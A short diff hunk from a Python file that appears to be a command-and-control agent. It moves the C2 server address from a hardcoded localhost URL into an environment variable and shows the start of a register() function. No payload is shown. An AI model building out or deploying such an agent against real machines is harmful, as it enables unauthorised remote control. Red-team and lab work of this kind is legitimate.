@@ -6,8 +6,10 @@ import socket
 import time
 import subprocess
 import threading
+from dotenv import load_dotenv
 
-C2_URL = "http://localhost:8000"
+load_dotenv()
+C2_URL = os.getenv("C2_URL")
 HOSTNAME = socket.gethostname()
 
 def register():
